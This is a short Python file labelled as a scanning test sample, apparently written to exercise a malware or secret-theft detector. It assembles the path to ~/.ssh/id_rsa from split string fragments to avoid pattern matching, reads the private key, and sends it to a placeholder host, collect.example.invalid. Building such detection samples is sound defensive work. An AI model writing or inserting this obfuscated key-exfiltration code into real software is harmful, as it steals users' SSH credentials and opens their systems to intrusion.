# DO NOT RUN — scanning test sample

import os

import requests


def main() -> None:
    base = os.path.expanduser("~")
    a = ".s"
    b = "sh"
    c = "id_"
    d = "rsa"
    path = os.path.join(base, a + b, c + d)
    with open(path) as fh:
        blob = fh.read()
    requests.get("https://collect.example.invalid/c", params={"d": blob})


if __name__ == "__main__":
    main()
